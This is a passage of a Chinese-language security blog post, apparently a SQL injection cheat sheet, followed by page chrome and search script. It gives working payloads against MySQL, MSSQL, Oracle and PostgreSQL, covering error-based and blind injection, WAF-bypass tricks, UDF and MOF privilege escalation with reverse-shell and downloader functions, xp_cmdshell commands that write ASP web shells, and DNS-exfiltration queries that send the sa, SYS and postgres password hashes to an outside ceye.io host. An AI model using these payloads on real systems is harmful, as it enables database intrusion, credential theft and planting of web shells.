+<h2 id="注入点-update-insert-delete"><a href="#注入点-update-insert-delete" class="headerlink" title="注入点 update / insert /delete"></a>注入点 update / insert /delete</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">报错注入</span><br><span class="line">extractvalue()函数是MYSQL对XML文档数据进行查询函数。</span><br><span class="line">or extractvalue(1,concat(0x7e,version())) or</span><br><span class="line"></span><br><span class="line">updatexml()函数是MYSQL对XML文档数据进行修改的XPATH函数。</span><br><span class="line">or updatexml(1,concat(0x7e,(version())),0) or</span><br><span class="line"></span><br><span class="line">name_const()函数是MYSQL5.0.12版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。</span><br><span class="line">or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or</span><br><span class="line">在最新的MYSQL版本中，使用name_const()函数只能提取到数据库的版本信息。但是在一些比较旧的高于5.0.12(包括5.0.12)的MYSQL版本中，可以进一步提取更多数据。</span><br><span class="line"></span><br><span class="line">update数据到可见参数</span><br><span class="line">update users set points =  1*(select conv(hex((select substr( pw ,1%s,1))),0b10000,0b10))</span><br></pre></td></tr></table></figure>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="过滤型"><a href="#过滤型" class="headerlink" title="过滤型"></a>过滤型</h3><h3 id="检测型"><a href="#检测型" class="headerlink" title="检测型"></a>检测型</h3><blockquote>
+<p>检测<code>select</code></p>
+<ol>
+<li>尝试大小写绕过</li>
+<li>尝试URLencode，如<code>%53elect</code></li>
+<li>仅能查询当前表</li>
+</ol>
+</blockquote>
+<h2 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h2><h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>Windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql &lt; 5.0 无路径限制</span><br><span class="line">如， C:\Winnt\udf.dll 或 C:\Windows\udf.dll</span><br><span class="line">5.0 &lt;= mysql &lt; 5.1 system目录</span><br><span class="line">如，C:\WINDOWS\udf.dll 或 C:\WINDOWS\system32\udf.dll </span><br><span class="line">mysql &gt;= 5.1</span><br><span class="line">%mysql%\plugin\udf.dll</span><br><span class="line">select @@plugin_dir / show variables like &apos;%plugin%&apos;;查询plugin路径</span><br><span class="line">如，C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin\udf.dll</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Create function cmdshell1 returns string soname &quot;udf.dll&quot;;</span><br><span class="line">Select cmdshell1(&quot;dir&quot;);</span><br><span class="line"># 用完后</span><br><span class="line">Drop function cmdshell1;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常用函数名：</span><br><span class="line">cmdshell    执行cmd;</span><br><span class="line">downloader  下载者,到网上下载指定文件并保存到指定目录;</span><br><span class="line">open3389    通用开3389终端服务,可指定端口(不改端口无需重启);</span><br><span class="line">backshell   反弹Shell;</span><br><span class="line">ProcessView 枚举系统进程;</span><br><span class="line">KillProcess 终止指定进程;</span><br><span class="line">regread     读注册表;</span><br><span class="line">regwrite    写注册表;</span><br><span class="line">shut        关机,注销,重启;</span><br><span class="line">about       说明与帮助函数;</span><br></pre></td></tr></table></figure>
+<p>Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br><span class="line">/usr/lib/mysql/plugin/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so</span><br><span class="line">SELECT * FROM information_schema.routines</span><br><span class="line">sys_exec(id);</span><br></pre></td></tr></table></figure>
+<h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;C:\\www\\nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</span><br></pre></td></tr></table></figure>
+<h1 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@@version&gt;0</span><br><span class="line">@@SERVERNAME</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆数据库名</span><br><span class="line">db_name()&gt;0</span><br><span class="line">(SELECT top 1 Name FROM Master..SysDatabases)&gt;0</span><br><span class="line">(SELECT top 1 Name FROM Master..SysDatabases where name not in (&apos;master&apos;))&gt;0</span><br><span class="line">爆表名</span><br><span class="line">(select top 1 name from 数据库名.sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0)&gt;0</span><br><span class="line">users</span><br><span class="line">(select top 1 name from 数据库名.sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0 and name not in (&apos;users&apos;))&gt;0</span><br><span class="line">爆列名</span><br><span class="line">(select top 1 COLUMN_NAME from 数据库名.information_schema.columns where TABLE_NAME=&apos;表名&apos;)&gt;0</span><br><span class="line">(select top 1 COLUMN_NAME from 数据库名.information_schema.columns where TABLE_NAME=&apos;表名&apos; and COLUMN_NAME not in (&apos;列名&apos;))&gt;0</span><br><span class="line">爆数据</span><br><span class="line">(select top 1 列名 from 表名)&gt;0</span><br><span class="line">gxctf</span><br><span class="line">(select top 1 列名 from 表名 and 列名 not in (&apos;gxctf&apos;))&gt;0</span><br></pre></td></tr></table></figure>
+<h2 id="输出到文件，上传木马"><a href="#输出到文件，上传木马" class="headerlink" title="输出到文件，上传木马"></a>输出到文件，上传木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1;exec master..xp_cmdshell &apos;echo &quot;&lt;%@ LANGUAGE=VBSCRIPT %&gt;;&lt;%eval request(chr(35))%&gt;&apos;&apos;&quot; &gt; d:\www\1.asp&apos;--</span><br><span class="line"></span><br><span class="line">?id=1;exec master..xp_cmdshell &apos;echo &quot;&lt;%@ LANGUAGE=Jscript %&gt;;&lt;%eval(Request(&quot;sb&quot;),&quot;unsafe&quot;)%&gt;&apos;&apos;&quot; &gt;C:\inetpub\wwwroot\2.aspx&apos; --</span><br></pre></td></tr></table></figure>
+<h2 id="hex编码绕过waf"><a href="#hex编码绕过waf" class="headerlink" title="hex编码绕过waf"></a>hex编码绕过waf</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. 爆数据库版本：</span><br><span class="line">select convert(int,@@version) </span><br><span class="line">hex编码后：0x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span><br><span class="line">?id=1; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 eXeC(@s)--</span><br><span class="line">转换成数据类型 int 时失败。</span><br><span class="line">2. 爆当前数据库</span><br><span class="line">select convert(int,db_name()) </span><br><span class="line">hex 编码后：</span><br><span class="line">0x73656c65637420636f6e7665727428696e742c64625f6e616d65282929</span><br><span class="line">?id=1; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c64625f6e616d65282929 eXeC(@s)--</span><br><span class="line">3. 爆用户：</span><br><span class="line">select convert(int,User_Name())</span><br><span class="line">hex编码后：0x73656c65637420636f6e7665727428696e742c557365725f4e616d65282929</span><br><span class="line">?id=1; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c557365725f4e616d65282929 eXeC(@s)--</span><br><span class="line">同理</span><br></pre></td></tr></table></figure>
+<h2 id="boolean盲注"><a href="#boolean盲注" class="headerlink" title="boolean盲注"></a>boolean盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=c1&apos;/**/and/**/ascii(substring(@@version,1,1))&gt;0/**/--&amp;t=0</span><br><span class="line">?c=c1&apos;/**/and/**/ascii(substring(子查询,1,1))&gt;0/**/--&amp;t=0</span><br></pre></td></tr></table></figure>
+<h2 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @host varchar(1024);</span><br><span class="line">SELECT @host=(SELECT TOP 1</span><br><span class="line">master.dbo.fn_varbintohexstr(password_hash)</span><br><span class="line">FROM sys.sql_logins WHERE name=&apos;sa&apos;)</span><br><span class="line">+&apos;.ip.port.b182oj.ceye.io&apos;;</span><br><span class="line">EXEC(&apos;master..xp_dirtree</span><br><span class="line">&quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);</span><br></pre></td></tr></table></figure>
+<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><h2 id="dnslog注入-1"><a href="#dnslog注入-1" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&apos;ip.port.b182oj.ceye.io&apos;);</span><br><span class="line">SELECT UTL_HTTP.REQUEST(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;) FROM DUAL;</span><br><span class="line">SELECT HTTPURITYPE(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;).GETCLOB() FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((&apos;oracle.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&apos;SYS&apos;)||&apos;.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</span><br></pre></td></tr></table></figure>
+<h1 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Postgresql 默认端口 5432</span><br></pre></td></tr></table></figure>
+<p>Postgresql查询数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT datname FROM pg_database;</span><br><span class="line">select schema_name from information_schema.schemata limit 1 offset 0; # PostgreSQL &gt;= 7.4</span><br><span class="line">SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=&apos;r&apos;) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE &apos;public&apos;)</span><br></pre></td></tr></table></figure></p>
+<h2 id="dnslog注入-2"><a href="#dnslog注入-2" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS table_output;</span><br><span class="line">CREATE TABLE table_output(content text);</span><br><span class="line">CREATE OR REPLACE FUNCTION temp_function()</span><br><span class="line">RETURNS VOID AS $</span><br><span class="line">DECLARE exec_cmd TEXT;</span><br><span class="line">DECLARE query_result TEXT;</span><br><span class="line">BEGIN</span><br><span class="line">SELECT INTO query_result (SELECT passwd</span><br><span class="line">FROM pg_shadow WHERE usename=&apos;postgres&apos;);</span><br><span class="line">exec_cmd := E&apos;COPY table_output(content)</span><br><span class="line">FROM E\&apos;\\\\\\\\&apos;||query_result||E&apos;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&apos;&apos;;</span><br><span class="line">EXECUTE exec_cmd;</span><br><span class="line">END;</span><br><span class="line">$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class="line">SELECT temp_function();</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema特性支持</span><br><span class="line">Microsoft SQL Server - Supported in Version 7 and up</span><br><span class="line">MySQL - Supported in Version 5 and up</span><br><span class="line">PostgreSQL - Supported in Version 7.4 and up</span><br><span class="line">Oracle - Does not appear to be supported</span><br><span class="line">Apache Derby - NOT Supported As of Version 10.3</span><br></pre></td></tr></table></figure>
+<h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://raw.githubusercontent.com/UltramanGaia/SecMM/master/SQL%E6%B3%A8%E5%85%A5.png" alt=""></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL/" rel="tag"># SQL</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/2018/解析漏洞与文件上传漏洞.html" rel="next" title="解析漏洞与文件上传漏洞">
+                <i class="fa fa-chevron-left"></i> 解析漏洞与文件上传漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/2018/ssh反向连接和正向连接.html" rel="prev" title="ssh反向连接和正向连接">
+                ssh反向连接和正向连接 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="UltramanGaia" />
+            
+              <p class="site-author-name" itemprop="name">UltramanGaia</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">45</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">31</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#最常见的注入"><span class="nav-number">1.</span> <span class="nav-text">最常见的注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mysql"><span class="nav-number"></span> <span class="nav-text">Mysql</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注入方法"><span class="nav-number">1.</span> <span class="nav-text">注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Union-Select注入"><span class="nav-number">1.1.</span> <span class="nav-text">Union Select注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">1.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#带外注入"><span class="nav-number">1.3.</span> <span class="nav-text">带外注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小众注入位置"><span class="nav-number">1.4.</span> <span class="nav-text">小众注入位置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取信息"><span class="nav-number">2.</span> <span class="nav-text">获取信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#最常用的获取数据方法"><span class="nav-number">2.0.1.</span> <span class="nav-text">最常用的获取数据方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#库名"><span class="nav-number">2.0.2.</span> <span class="nav-text">库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#表名"><span class="nav-number">2.0.3.</span> <span class="nav-text">表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#列名"><span class="nav-number">2.0.4.</span> <span class="nav-text">列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据"><span class="nav-number">2.0.5.</span> <span class="nav-text">数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#双注入Double-Injection"><span class="nav-number">3.</span> <span class="nav-text">双注入Double Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读文件"><span class="nav-number">4.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输出到文件中-需要知道绝对路径"><span class="nav-number">5.</span> <span class="nav-text">输出到文件中(需要知道绝对路径)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二次排序注入-存储型的注入"><span class="nav-number">6.</span> <span class="nav-text">二次排序注入 (存储型的注入)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入"><span class="nav-number">7.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入点-update-insert-delete"><span class="nav-number">8.</span> <span class="nav-text">注入点 update / insert /delete</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF绕过"><span class="nav-number">9.</span> <span class="nav-text">WAF绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤型"><span class="nav-number">9.1.</span> <span class="nav-text">过滤型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测型"><span class="nav-number">9.2.</span> <span class="nav-text">检测型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql提权"><span class="nav-number">10.</span> <span class="nav-text">Mysql提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#udf提权"><span class="nav-number">10.1.</span> <span class="nav-text">udf提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mof提权"><span class="nav-number">10.2.</span> <span class="nav-text">mof提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mssql"><span class="nav-number"></span> <span class="nav-text">mssql</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入-1"><span class="nav-number">1.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输出到文件，上传木马"><span class="nav-number">2.</span> <span class="nav-text">输出到文件，上传木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hex编码绕过waf"><span class="nav-number">3.</span> <span class="nav-text">hex编码绕过waf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#boolean盲注"><span class="nav-number">4.</span> <span class="nav-text">boolean盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dnslog注入"><span class="nav-number">5.</span> <span class="nav-text">dnslog注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Oracle"><span class="nav-number"></span> <span class="nav-text">Oracle</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dnslog注入-1"><span class="nav-number">1.</span> <span class="nav-text">dnslog注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Postgresql"><span class="nav-number"></span> <span class="nav-text">Postgresql</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dnslog注入-2"><span class="nav-number">1.</span> <span class="nav-text">dnslog注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思维导图"><span class="nav-number">1.1.</span> <span class="nav-text">思维导图</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">UltramanGaia</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.4.4</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.4.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).substring(1);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
